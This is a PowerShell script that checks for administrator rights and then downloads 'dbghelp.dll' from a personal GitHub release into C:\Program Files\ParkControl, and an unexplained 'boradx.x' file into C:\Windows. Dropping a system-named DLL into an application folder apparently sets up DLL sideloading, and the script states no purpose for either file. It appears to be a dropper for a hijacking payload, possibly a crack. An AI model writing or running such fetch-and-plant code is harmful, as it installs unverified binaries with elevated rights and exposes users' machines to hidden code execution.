# Check if running with administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "This script requires administrative privileges. Please run PowerShell as Administrator."
    exit 1
}

# Define URLs and destination paths
$dllUrl = "https://github.com/boradxshlok/DLL/releases/download/randomscrandssr/dbghelp.dll"
$dllPath = "C:\Program Files\ParkControl\dbghelp.dll"
$boradxUrl = "https://github.com/boradxshlok/DLL/releases/download/randomscrandssr/boradx.x"
$boradxPath = "C:\Windows\boradx.x"

# Ensure the ParkControl directory exists
$parkControlDir = "C:\Program Files\ParkControl"
if (-not (Test-Path -Path $parkControlDir)) {
    New-Item -ItemType Directory -Path $parkControlDir -Force | Out-Null
}

# Function to download a file
function Download-File {
    param (
        [string]$url,
        [string]$destination
    )
    try {
        Write-Host "Downloading $url to $destination..."
        Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
        Write-Host "Successfully downloaded to $destination"
    }
    catch {
        Write-Error "Failed to download $url. Error: $_"
        exit 1
    }
}

# Download the DLL file
Download-File -url $dllUrl -destination $dllPath

# Download the boradx.x file
Download-File -url $boradxUrl -destination $boradxPath

Write-Host "All files downloaded successfully."
